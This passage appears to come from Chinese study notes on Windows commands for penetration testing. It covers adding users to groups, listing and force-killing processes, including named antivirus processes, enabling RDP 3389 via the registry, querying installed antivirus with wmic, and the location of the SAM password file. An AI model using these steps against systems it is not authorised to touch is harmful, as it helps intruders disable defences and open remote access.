  <code>net localgroup 用户组 用户名 /add</code>：将指定用户添加指定组</p><h3 id="3-进程命令"><a href="#3-进程命令" class="headerlink" title="3.进程命令"></a>3.进程命令</h3><p>​            <code>tasklist</code>：查看进程</p><p>​            <code>tasklist /svc</code>：显示进程名字、PID及其服务</p><p>​                    相关进程名字：360：<code>ZhuDongFangYu.exe</code>  </p><p>​                                                安全狗：<code>SafeDogUpdateCenter.exe</code></p><p>​                                                远程桌面：<code>teamservice.exe</code></p><p>​                    <code>tasklist /svc &gt; 文件名字</code>：将进程信息输入到对应的文件中</p><p>​            <code>taskkill</code>：杀死进程</p><p>​                    <code>taskkill /f /im 进程名</code>：杀死对应进程，/f：强制执行</p><h3 id="4-网络命令"><a href="#4-网络命令" class="headerlink" title="4.网络命令"></a>4.网络命令</h3><p>​            <code>Ipconfig /all</code>：查看本地网络详细信息</p><p>​            <code>netstat  -ano</code>：查看本地网络信息</p><p>​                    <code>netstat -ano | findstr &quot;端口号&quot;</code>：查看对应端口是否开启</p><p>​                    通过修改注册表开启3389：</p><p>​                        <code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 000000000 /f</code></p><pre><code class="hljs shell">C:\Users\administrator.MCITP&gt;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 000000000 /f操作成功完成。C:\Users\administrator.MCITP&gt;</code></pre><p>​                     关闭3389：</p><p><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</code></p><pre><code class="hljs shell">C:\Users\administrator.MCITP&gt;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f操作成功完成。C:\Users\administrator.MCITP&gt;</code></pre><h3 id="5-系统命令"><a href="#5-系统命令" class="headerlink" title="5.系统命令"></a>5.系统命令</h3><p>​            <code>ver</code>：查看系统版本</p><p>​                    <code>Windows 5.1-win 2003/xp </code></p><p>​                    <code>Windows 5.2-win xp</code> </p><p>​                    <code>                     Windows 6.1-win 7/2008</code> </p><p>​                    <code>Windows 6.2-win 8/2012</code></p><p>​                    <code>Windows 10-win 10</code></p><p>​            <code>systeminfo</code>：查看Windows详细信息</p><p>​            <code>wmic os get caption,csdversion,osarchitecture,version</code>：查看系统版本信息</p><p>​            <code>wmic /node:localhost /namespace:\\root\securitycenter2 path antivirusproduct get displayname /format:list</code>：查看当前系统杀软信息</p><p>​          <code>wmic product get name,version</code>：查看当前系统安装的应用以及版本信息</p><p>​            </p><h2 id="6-Windows认证及密码"><a href="#6-Windows认证及密码" class="headerlink" title="6.Windows认证及密码"></a>6.Windows认证及密码</h2><p>​            密码存储文件sam：c:/windows/system32/config/SAM</p><p>​            密码加密类型</p><p>​                    ntlm hash：明文-16h-Unicode-md4-16h</p><p>​                            ntml v1             ntml v2</p><p>​                    lm hash(已被淘汰)</p><p>​            登录过程</p><p>​                    Winlogin.exe-&gt;lsass.exe-&gt;认证</p><p>​            win版本&amp;&amp;密码版本</p><p>​                    Win2000-lm hash、win2003-ntlm hash、win7-ntlm hash v2</p><h2 id="7-Windows-UAC（win7以上）"><a href="#7-Windows-UAC（win7以上）" class="headerlink" title="7.Windows UAC（win7以上）"></a>7.Windows UAC（win7以上）</h2><p>​            认证控制（以管理员权限运行触发）</p><p><img src="data:image/png;base64,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